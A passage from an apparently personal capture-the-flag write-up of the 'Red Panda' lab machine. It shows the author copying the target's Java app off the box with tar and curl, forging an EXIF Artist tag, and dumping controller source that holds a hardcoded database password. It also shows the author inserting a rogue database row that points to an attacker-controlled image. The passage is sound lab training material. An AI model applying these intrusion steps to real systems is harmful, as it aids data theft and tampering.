<span class="w">    </span><span class="n">addViewTo</span><span class="p">(</span><span class="n">xmlPath</span><span class="p">,</span><span class="w"> </span><span class="n">parsed_data</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;uri&quot;</span><span class="p">).</span><span class="na">toString</span><span class="p">());</span>
<span class="p">}</span>

<span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
<p>I’ll be exfiltrating the whole app to look at it in vscode</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>tar<span class="w"> </span>-cvzf<span class="w"> </span>/dev/shm/logparse.tar.gz<span class="w"> </span>LogParser/
curl<span class="w"> </span>http://10.10.11.170:8000/logparse.tar.gz<span class="w"> </span>-O
</pre></div>
</div>
<p>So what this app does is, it adds creds to the artists of each of the panda based on the number of views they have. And to to that it reads the log at <code class="docutils literal notranslate"><span class="pre">/opt/panda_search/redpanda.log</span></code> which is loging whatever users request, for instance here, I requests <code class="docutils literal notranslate"><span class="pre">nyanyanya</span></code>, so that’s one input we have control over</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>redpanda.log

<span class="m">200</span><span class="o">||</span><span class="m">10</span>.10.14.10<span class="o">||</span>Mozilla/5.0<span class="w"> </span><span class="o">(</span>X11<span class="p">;</span><span class="w"> </span>Linux<span class="w"> </span>x86_64<span class="p">;</span><span class="w"> </span>rv:78.0<span class="o">)</span><span class="w"> </span>Gecko/20100101<span class="w"> </span>Firefox/78.0<span class="o">||</span>/search
<span class="m">404</span><span class="o">||</span><span class="m">10</span>.10.14.81<span class="o">||</span>Mozilla/5.0<span class="w"> </span><span class="o">(</span>X11<span class="p">;</span><span class="w"> </span>Linux<span class="w"> </span>aarch64<span class="p">;</span><span class="w"> </span>rv:102.0<span class="o">)</span><span class="w"> </span>Gecko/20100101<span class="w"> </span>Firefox/102.0<span class="o">||</span>/nyanyanya
<span class="m">404</span><span class="o">||</span><span class="m">10</span>.10.14.81<span class="o">||</span>Mozilla/5.0<span class="w"> </span><span class="o">(</span>X11<span class="p">;</span><span class="w"> </span>Linux<span class="w"> </span>aarch64<span class="p">;</span><span class="w"> </span>rv:102.0<span class="o">)</span><span class="w"> </span>Gecko/20100101<span class="w"> </span>Firefox/102.0<span class="o">||</span>/error
</pre></div>
</div>
<p>The Java app then looks at the metadata for the images is has in <code class="docutils literal notranslate"><span class="pre">/opt/panda_search/src/main/resources/static/img</span></code> to find the artist of the panda that was requested by the user, and finally it goes and writes the result in <code class="docutils literal notranslate"><span class="pre">/credits/&lt;artist&gt;_creds.xml</span></code> which is presumably what we’re looking at when visiting <a class="reference external" href="http://panda.htb:8080/stats">http://panda.htb:8080/stats</a></p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>woodenk@redpanda:/opt/panda_search/src/main/resources/static/img$<span class="w"> </span>ls<span class="w"> </span>-la
total<span class="w"> </span><span class="m">3516</span>
drwxrwxr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">    </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">16</span>:40<span class="w"> </span>.
drwxrwxr-x<span class="w"> </span><span class="m">4</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">    </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">14</span><span class="w"> </span><span class="m">14</span>:35<span class="w"> </span>..
-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">  </span><span class="m">223965</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">21</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>angy.jpg
-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">1075102</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">16</span>:37<span class="w"> </span>crafty.jpg
-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">    </span><span class="m">6148</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">14</span><span class="w">  </span><span class="m">2021</span><span class="w"> </span>.DS_Store
-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">  </span><span class="m">111370</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">21</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>florida.jpg
-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">  </span><span class="m">102758</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">21</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>greg.jpg
-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">  </span><span class="m">651102</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">21</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>hungy.jpg
-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">  </span><span class="m">852778</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">21</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>lazy.jpg
-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">   </span><span class="m">70716</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">21</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>mr_puffy.jpg
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">   </span><span class="m">31800</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">16</span>:40<span class="w"> </span>peter.jpg
-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">   </span><span class="m">45716</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">21</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>shy.jpg
-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">  </span><span class="m">200457</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">21</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>smiley.jpg
-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">  </span><span class="m">195963</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">21</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>smooch.jpg
</pre></div>
</div>
<p>Just exfiltrating one of the images to look at the tag</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>http://10.10.11.170:8000/smooch.jpg<span class="w"> </span>-O

file<span class="w"> </span>smooch.jpg
smooch.jpg:<span class="w"> </span>JPEG<span class="w"> </span>image<span class="w"> </span>data,<span class="w"> </span>Exif<span class="w"> </span>standard:<span class="w"> </span><span class="o">[</span>TIFF<span class="w"> </span>image<span class="w"> </span>data,<span class="w"> </span>big-endian,<span class="w"> </span><span class="nv">direntries</span><span class="o">=</span><span class="m">5</span>,<span class="w"> </span><span class="nv">xresolution</span><span class="o">=</span><span class="m">74</span>,<span class="w"> </span><span class="nv">yresolution</span><span class="o">=</span><span class="m">82</span>,<span class="w"> </span><span class="nv">resolutionunit</span><span class="o">=</span><span class="m">2</span><span class="o">]</span>,<span class="w"> </span>progressive,<span class="w"> </span>precision<span class="w"> </span><span class="m">8</span>,<span class="w"> </span>1024x1280,<span class="w"> </span>components<span class="w"> </span><span class="m">3</span>

exiftool<span class="w"> </span>-Artist<span class="w"> </span>smooch.jpg
Artist<span class="w">                          </span>:<span class="w"> </span>woodenk
</pre></div>
</div>
<p>Let see what happens if I make a hamster.jpg with an Artist tag of blnkn</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>exiftool<span class="w"> </span>-Artist<span class="o">=</span><span class="s2">&quot;blnkn&quot;</span><span class="w"> </span>hamster.jpg
<span class="m">1</span><span class="w"> </span>image<span class="w"> </span>files<span class="w"> </span>updated
<span class="o">[</span>blnkn@Kolossus<span class="o">](</span>main<span class="w"> </span>%<span class="o">=)</span>:~/blnknlights.github.io/htb/machines/red_panda%<span class="w"> </span>exiftool<span class="w"> </span>-Artist<span class="w"> </span>hamster.jpg
Artist<span class="w">                          </span>:<span class="w"> </span>blnkn
</pre></div>
</div>
<p>woodenk doesn’t have write privileges in that directory though so lets looks at the source for the search part to see if we can point it to somewhere else maybe?</p>
<div class="highlight-java notranslate"><div class="highlight"><pre><span></span><span class="kn">package</span><span class="w"> </span><span class="nn">com.panda_search.htb.panda_search</span><span class="p">;</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.ArrayList</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.*</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.List</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.ArrayList</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.File</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStream</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.stereotype.Controller</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.ui.Model</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.GetMapping</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.PostMapping</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestParam</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.ResponseBody</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.ModelAndView</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.http.MediaType</span><span class="p">;</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.io.IOUtils</span><span class="p">;</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">org.jdom2.JDOMException</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.jdom2.input.SAXBuilder</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.jdom2.output.Format</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.jdom2.output.XMLOutputter</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.jdom2.*</span><span class="p">;</span>

<span class="nd">@Controller</span>
<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MainController</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&quot;/stats&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="n">ModelAndView</span><span class="w"> </span><span class="nf">stats</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&quot;author&quot;</span><span class="p">,</span><span class="n">required</span><span class="o">=</span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">author</span><span class="p">,</span><span class="w"> </span><span class="n">Model</span><span class="w"> </span><span class="n">model</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">JDOMException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="p">{</span>
<span class="w">                </span><span class="n">SAXBuilder</span><span class="w"> </span><span class="n">saxBuilder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SAXBuilder</span><span class="p">();</span>
<span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="n">author</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span>
<span class="w">                </span><span class="n">author</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;N/A&quot;</span><span class="p">;</span>
<span class="w">                </span><span class="n">author</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">author</span><span class="p">.</span><span class="na">strip</span><span class="p">();</span>
<span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="sc">&#39;&quot;&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">author</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="sc">&#39;&quot;&#39;</span><span class="p">);</span>
<span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="n">author</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;woodenk&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">author</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;damian&quot;</span><span class="p">))</span>
<span class="w">                </span><span class="p">{</span>
<span class="w">                        </span><span class="n">String</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;/credits/&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">author</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;_creds.xml&quot;</span><span class="p">;</span>
<span class="w">                        </span><span class="n">File</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>
<span class="w">                        </span><span class="n">Document</span><span class="w"> </span><span class="n">doc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">saxBuilder</span><span class="p">.</span><span class="na">build</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="w">                        </span><span class="n">Element</span><span class="w"> </span><span class="n">rootElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">doc</span><span class="p">.</span><span class="na">getRootElement</span><span class="p">();</span>
<span class="w">                        </span><span class="n">String</span><span class="w"> </span><span class="n">totalviews</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rootElement</span><span class="p">.</span><span class="na">getChildText</span><span class="p">(</span><span class="s">&quot;totalviews&quot;</span><span class="p">);</span>
<span class="w">                        </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Element</span><span class="o">&gt;</span><span class="w"> </span><span class="n">images</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rootElement</span><span class="p">.</span><span class="na">getChildren</span><span class="p">(</span><span class="s">&quot;image&quot;</span><span class="p">);</span>
<span class="w">                        </span><span class="k">for</span><span class="p">(</span><span class="n">Element</span><span class="w"> </span><span class="n">image</span><span class="p">:</span><span class="w"> </span><span class="n">images</span><span class="p">)</span>
<span class="w">                                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">image</span><span class="p">.</span><span class="na">getChildText</span><span class="p">(</span><span class="s">&quot;uri&quot;</span><span class="p">));</span>
<span class="w">                        </span><span class="n">model</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&quot;noAuthor&quot;</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span>
<span class="w">                        </span><span class="n">model</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&quot;author&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">author</span><span class="p">);</span>
<span class="w">                        </span><span class="n">model</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&quot;totalviews&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">totalviews</span><span class="p">);</span>
<span class="w">                        </span><span class="n">model</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&quot;images&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">images</span><span class="p">);</span>
<span class="w">                        </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ModelAndView</span><span class="p">(</span><span class="s">&quot;stats.html&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">                </span><span class="k">else</span>
<span class="w">                </span><span class="p">{</span>
<span class="w">                        </span><span class="n">model</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&quot;noAuthor&quot;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
<span class="w">                        </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ModelAndView</span><span class="p">(</span><span class="s">&quot;stats.html&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">  </span><span class="nd">@GetMapping</span><span class="p">(</span><span class="n">value</span><span class="o">=</span><span class="s">&quot;/export.xml&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">produces</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MediaType</span><span class="p">.</span><span class="na">APPLICATION_OCTET_STREAM_VALUE</span><span class="p">)</span>
<span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="nd">@ResponseBody</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">exportXML</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&quot;author&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">defaultValue</span><span class="o">=</span><span class="s">&quot;err&quot;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">author</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span>

<span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;Exporting xml of: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">author</span><span class="p">);</span>
<span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="n">author</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;woodenk&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">author</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;damian&quot;</span><span class="p">))</span>
<span class="w">                </span><span class="p">{</span>
<span class="w">                        </span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&quot;/credits/&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">author</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;_creds.xml&quot;</span><span class="p">);</span>
<span class="w">                        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">in</span><span class="p">);</span>
<span class="w">                        </span><span class="k">return</span><span class="w"> </span><span class="n">IOUtils</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">(</span><span class="n">in</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">                </span><span class="k">else</span>
<span class="w">                </span><span class="p">{</span>
<span class="w">                        </span><span class="k">return</span><span class="w"> </span><span class="n">IOUtils</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">(</span><span class="s">&quot;Error, incorrect paramenter &#39;author&#39;\n\r&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">  </span><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/search&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="n">ModelAndView</span><span class="w"> </span><span class="nf">search</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="p">(</span><span class="s">&quot;name&quot;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Model</span><span class="w"> </span><span class="n">model</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">name</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">())</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">                </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;Greg&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">filter</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
<span class="w">        </span><span class="n">ArrayList</span><span class="w"> </span><span class="n">pandas</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">searchPanda</span><span class="p">(</span><span class="n">query</span><span class="p">);</span>
<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;\n\&quot;&quot;</span><span class="o">+</span><span class="n">query</span><span class="o">+</span><span class="s">&quot;\&quot;\n&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">model</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&quot;query&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">query</span><span class="p">);</span>
<span class="w">        </span><span class="n">model</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&quot;pandas&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">pandas</span><span class="p">);</span>
<span class="w">        </span><span class="n">model</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&quot;n&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">pandas</span><span class="p">.</span><span class="na">size</span><span class="p">());</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ModelAndView</span><span class="p">(</span><span class="s">&quot;search.html&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">  </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">filter</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">arg</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">no_no_words</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s">&quot;%&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;_&quot;</span><span class="p">,</span><span class="s">&quot;$&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;~&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">};</span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">word</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">no_no_words</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">arg</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="n">word</span><span class="p">)){</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;Error occured: banned characters&quot;</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">arg</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">ArrayList</span><span class="w"> </span><span class="nf">searchPanda</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">query</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">        </span><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">        </span><span class="n">PreparedStatement</span><span class="w"> </span><span class="n">stmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">        </span><span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">ArrayList</span><span class="o">&gt;</span><span class="w"> </span><span class="n">pandas</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="p">();</span>
<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&quot;com.mysql.cj.jdbc.Driver&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="s">&quot;jdbc:mysql://localhost:3306/red_panda&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;woodenk&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;RedPandazRule&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="n">stmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="na">prepareStatement</span><span class="p">(</span><span class="s">&quot;SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="n">stmt</span><span class="p">.</span><span class="na">setString</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;%&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stmt</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">();</span>
<span class="w">            </span><span class="k">while</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">next</span><span class="p">()){</span>
<span class="w">                </span><span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">panda</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="p">();</span>
<span class="w">                </span><span class="n">panda</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&quot;name&quot;</span><span class="p">));</span>
<span class="w">                </span><span class="n">panda</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&quot;bio&quot;</span><span class="p">));</span>
<span class="w">                </span><span class="n">panda</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&quot;imgloc&quot;</span><span class="p">));</span>
<span class="w">                </span><span class="n">panda</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&quot;author&quot;</span><span class="p">));</span>
<span class="w">                </span><span class="n">pandas</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">panda</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">e</span><span class="p">);}</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">pandas</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
<p>And it’s looking at the db for the path of the image corresponding to a panda, so, we should be able to add our own pandhamster</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>mysql&gt; insert into pandas values(&#39;pandhamster&#39;,&#39;I\&#39;m a spy, please don\&#39;t tell them&#39;,&#39;/dev/shm/hamster.jpg&#39;, &#39;blnkn&#39;);
Query OK, 1 row affected (0.00 sec)

mysql&gt; SELECT name, bio, imgloc, author FROM pandas
    -&gt; ;
+-------------+------------------------------------------------------------------------------------+----------------------+---------+
| name        | bio                                                                                | imgloc               | author  |
+-------------+------------------------------------------------------------------------------------+----------------------+---------+
| Smooch      | Smooch likes giving kisses and hugs to everyone!                                   | img/smooch.jpg       | woodenk |
